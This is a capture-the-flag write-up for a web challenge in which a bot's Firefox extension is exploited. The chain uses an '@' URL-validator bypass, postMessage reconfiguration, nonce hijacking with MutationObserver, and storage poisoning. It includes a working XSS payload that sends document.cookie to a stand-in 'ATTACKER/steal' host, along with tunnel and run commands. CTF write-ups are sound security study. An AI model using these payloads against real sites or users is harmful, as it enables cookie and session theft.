# perchance — Solve Writeup

**Flag:** `NNS{PerHaps_You_Mi6ht_p05sib1Y_3Nj0Y_C7fs_P3RCh4NC3}`

---

## Challenge Overview

A web challenge where a bot visits URLs you submit. The bot runs Firefox with a custom Firefox extension installed. The flag is a cookie set on `doc.rust-lang.org`:

```
name:      flag
domain:    doc.rust-lang.org
path:      /stable/std/
httpOnly:  false        <-- readable by JS
sameSite:  Strict
```

The validator only accepts URLs that **start with** `https://doc.rust-lang.org`:

```typescript
// web_perchance/src/index.ts
if (!url || !url.startsWith('https://doc.rust-lang.org')) {
  return Response.json({ ok: false, error: 'Bad url' }, { status: 400 });
}
```

Each bot call spawns a **brand new browser** with fresh extension storage. `inUse` prevents concurrent sessions. The bot visits the URL, waits 40 seconds, then exits.

---

## Extension Architecture

### `background.js`

- Initializes storage: `activateOn = 'https://doc.rust-lang.org/'`, `previous = 'perchance'`
- `updateLastUrl` message handler: `storage.set({ previous: lastPage })`
- `webNavigation.onCompleted`: if `url.startsWith(activateOn) && url.includes('https://doc.rust-lang.org/')`, inject `cs.js`

### `assets/cs.js`

```javascript
// 1. Read 'previous' from storage and inject it into DOM via innerHTML (XSS sink!)
const prev = (await browser.storage.local.get('previous')).previous;
elm.innerHTML = `Previous: ${prev}`;

// 2. Create a module script to load filterXSS from localhost:3000
const nonce = 'a' + crypto.randomUUID().replaceAll('-', '');
const scr = document.createElement('script');
scr.type = 'module';
scr.textContent = `import ${nonce} from 'http://localhost:3000/jsxss.js'; window['${nonce}']=${nonce}`;
document.body.appendChild(scr);

// 3. Poll for window[nonce] (the imported filterXSS), then call it with location.href
//    and send the result as 'previous' for next time
function r() {
  if (!window.wrappedJSObject[nonce]) { setTimeout(r, 1); }
  else {
    browser.runtime.sendMessage({
      message: { type: 'updateLastUrl', lastPage: window.wrappedJSObject[nonce](location.href) }
    });
  }
}
r();
```

### `assets/options.js`

```javascript
async function updateConfig(new_url) {
  const u = new URL(new_url);
  // Validates the URL contains 'https://doc.rust-lang.org/' anywhere
  if (!u.href.includes('https://doc.rust-lang.org/')) return;
  await browser.storage.local.set({ activateOn: u.origin });
}
window.addEventListener('message', (e) => {
  if (e.data.match(/^https?/)) updateConfig(e.data);
});
```

---

## Exploit Chain

### 1. Bypass the URL Validator with the `@` Trick

HTTP URLs support `userinfo@host` syntax. The browser ignores the part before `@` as credentials.

```
Submit:    https://doc.rust-lang.org@ATTACKER/
Validator: sees "https://doc.rust-lang.org..." → ✅ passes
Browser:   navigates to https://ATTACKER/  (treats "doc.rust-lang.org" as username)
```

### 2. Reconfigure `activateOn` via postMessage

Our Phase 1 page embeds `options.html` in an iframe and sends:

```
postMessage('https://ATTACKER/bypass?https://doc.rust-lang.org/', '*')
```

`options.js` calls `updateConfig(url)`. The URL includes `'https://doc.rust-lang.org/'` as a query parameter → validation passes → sets `activateOn = 'https://ATTACKER'`.

### 3. Get `cs.js` Injected into Our Trigger Page

After changing `activateOn`, redirect to:

```
https://ATTACKER/trigger?https://doc.rust-lang.org/
```

`background.js` `onCompleted` fires:
- `url.startsWith('https://ATTACKER')` ✅
- `url.includes('https://doc.rust-lang.org/')` ✅

→ `cs.js` is injected into our trigger page.

### 4. Intercept the Nonce via MutationObserver

`cs.js` creates a `<script type="module">` with a random nonce like `a9f3b2c1...`. Before the import resolves, we intercept with a `MutationObserver`:

```javascript
const observer = new MutationObserver((mutations) => {
  for (const node of ...) {
    if (node.tagName === 'SCRIPT' && node.type === 'module') {
      const match = node.textContent.match(/import (a[0-9a-f]{32}) from/);
      if (match) {
        const nonce = match[1];
        // Poison window[nonce] before the import resolves
        Object.defineProperty(window, nonce, {
          get: function() {
            return function fakeFilterXSS(url) {
              return xssPayload;  // malicious HTML
            };
          }
        });
      }
    }
  }
});
observer.observe(document.documentElement, { childList: true, subtree: true });
```

### 5. Poison `previous` in Extension Storage

`cs.js` polls `window.wrappedJSObject[nonce]`, finds our `fakeFilterXSS`, calls it with `location.href`, and sends the result via `updateLastUrl`. `background.js` stores the XSS payload as `previous`.

**XSS payload:**
```html
<img src=x onerror="try{
  var c=encodeURIComponent(location.href+'|'+document.cookie);
  new Image().src='https://ATTACKER/steal?c='+c;
  fetch('https://ATTACKER/steal?c='+c);
  navigator.sendBeacon('https://ATTACKER/steal?c='+c);
}catch(e){
  new Image().src='https://ATTACKER/beacon?step=err&msg='+encodeURIComponent(e.message);
}">
```

**Key**: URLs inside `onerror="..."` must use **single quotes**, not double quotes — double quotes would break the HTML attribute boundary.

### 6. Reset `activateOn` and Navigate (Still Same Session)

```javascript
// Wait 5s for async storage.set to complete
await sleep(5000);

// Reset activateOn back to doc.rust-lang.org so onCompleted fires there
iframe.contentWindow.postMessage('https://doc.rust-lang.org/', '*');
await sleep(2000);

// Navigate in the same browser tab
window.location.href = 'https://doc.rust-lang.org/stable/std/';
```

### 7. XSS Fires on Real Rust Docs, Flag Stolen

`background.js` `onCompleted` fires on `doc.rust-lang.org/stable/std/`:
- `url.startsWith('https://doc.rust-lang.org/')` ✅ (activateOn was reset)
- `url.includes('https://doc.rust-lang.org/')` ✅

→ `cs.js` injected. Reads `previous` = our XSS payload. Does `elm.innerHTML = \`Previous: ${prev}\``.

The `<img onerror>` fires on the real Rust docs page. `document.cookie` = `flag=NNS{...}`. Triple exfil (Image, fetch, sendBeacon) delivers it to `/steal`.

---

## Critical Lessons Learned

| Issue | Root Cause | Fix |
|-------|-----------|-----|
| Phase 2 never gets storage | Each bot call = new browser, fresh storage | Everything in ONE 40s session |
| `/steal` never hit (old attempts) | `JSON.stringify(url)` adds double quotes, breaking `onerror="..."` | Use single-quoted URL strings inside the attribute |
| Storage poisoned but XSS didn't fire | Race: async `storage.set` not done before navigation | `await sleep(5000)` after poison confirmed |
| bot never hits Rust docs | `activateOn` still points to our domain | Reset with postMessage + `await sleep(2000)` before navigating |
| Random 429 errors | Instance browser stuck from previous attempt | Get a fresh instance; retry script handles transient 429s |
| Tunnel dies silently | localhost.run anonymous tunnels are unreliable | Probe tunnel with HTTP GET before submitting |

---

## Running the Exploit

```bash
# Terminal 1: Open tunnel (keep running)
ssh -R 80:localhost:8080 nokey@localhost.run
# -> https://XXXX.lhr.life

# Edit submit.py: set CHALLENGE_URL to your instance

# Terminal 2: Start server (watch for flag here)
cd exploit/
python server.py https://XXXX.lhr.life

# Terminal 3: Submit
python submit.py https://XXXX.lhr.life
```

### Beacon Chain (What Success Looks Like)

```
[BEACON] [phase1] Phase 1 loaded
[BEACON] [phase1] window.open called: success
[BEACON] [phase1] postMessage sent to popup/iframe
[BEACON] [phase1] Redirecting to trigger
[BEACON] [trigger] Trigger loaded
[BEACON] [trigger] MutationObserver attached
[BEACON] [trigger] Found module script node: import a... from 'htt
[BEACON] [trigger] Extracted nonce: a...
[BEACON] [trigger] Nonce getter invoked!
[BEACON] [trigger] fakeFilterXSS called with: https://TUNNEL/trigger?...
[BEACON] [trigger] After wait loop, poisoned=true
[BEACON] [trigger] Reset sent to popup
[BEACON] [trigger] Reset sent to iframe
[BEACON] [trigger] Navigating to target doc.rust-lang.org/stable/std/

============================================================
[!!!] FLAG RECEIVED!
      https://doc.rust-lang.org/stable/std/|flag=NNS{PerHaps_You_Mi6ht_p05sib1Y_3Nj0Y_C7fs_P3RCh4NC3}
============================================================
```
